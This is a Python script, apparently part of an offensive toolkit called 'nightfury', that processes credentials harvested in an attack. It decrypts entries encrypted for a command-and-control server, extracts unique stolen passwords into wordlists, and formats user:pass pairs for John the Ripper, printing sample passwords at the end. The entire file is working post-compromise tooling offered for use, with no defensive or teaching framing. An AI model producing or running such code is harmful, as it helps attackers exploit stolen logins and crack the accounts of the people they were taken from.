#!/usr/bin/env python3
import json
import os
from cryptography.fernet import Fernet

class CrackPrep:
    """
    Formats harvested credentials for password cracking tools.
    Supports Hashcat, John the Ripper, and custom wordlist generation.
    Now supports decryption of encrypted data from the C2 server.
    """
    def __init__(self, 
                 log_path="/home/ubuntu/nightfury/logs/harvested_creds.json",
                 key_path="/home/ubuntu/nightfury/config/c2_encryption.key"):
        self.log_path = log_path
        self.key_path = key_path
        self.fernet = None
        self._load_key()

    def _load_key(self):
        """Loads the encryption key for decryption."""
        if os.path.exists(self.key_path):
            with open(self.key_path, 'rb') as f:
                key = f.read()
            self.fernet = Fernet(key)
        else:
            print(f"[!] Warning: Encryption key not found at {self.key_path}. Decryption will fail.")

    def _decrypt(self, encrypted_data):
        """Decrypts data using the loaded key."""
        if not self.fernet:
            return encrypted_data
        try:
            decrypted = self.fernet.decrypt(encrypted_data.encode()).decode()
            try:
                return json.loads(decrypted)
            except json.JSONDecodeError:
                return decrypted
        except Exception as e:
            print(f"[!] Decryption error: {e}")
            return encrypted_data

    def extract_passwords(self):
        """Extracts unique passwords for wordlist generation."""
        passwords = set()
        if not os.path.exists(self.log_path):
            return []
            
        with open(self.log_path, 'r') as f:
            for line in f:
                try:
                    entry = json.loads(line)
                    # Check for encrypted data first
                    if 'encrypted_data' in entry:
                        data = self._decrypt(entry['encrypted_data'])
                    else:
                        data = entry.get('data', {})
                    
                    if isinstance(data, dict):
                        pwd = data.get('p')
                        if pwd:
                            passwords.add(pwd)
                except json.JSONDecodeError:
                    continue
        return sorted(list(passwords))

    def format_for_john(self, output_file):
        """Formats credentials as user:pass for John the Ripper."""
        count = 0
        if not os.path.exists(self.log_path):
            return 0

        with open(output_file, 'w') as out, open(self.log_path, 'r') as f:
            for line in f:
                try:
                    entry = json.loads(line)
                    if 'encrypted_data' in entry:
                        data = self._decrypt(entry['encrypted_data'])
                    else:
                        data = entry.get('data', {})
                    
                    if isinstance(data, dict):
                        user = data.get('u', 'unknown')
                        pwd = data.get('p')
                        if pwd:
                            out.write(f"{user}:{pwd}\n")
                            count += 1
                except json.JSONDecodeError:
                    continue
        return count

if __name__ == "__main__":
    cp = CrackPrep()
    pwds = cp.extract_passwords()
    print(f"[*] Extracted {len(pwds)} unique passwords for wordlists.")
    if pwds:
        print(f"[+] Sample passwords: {pwds[:5]}")
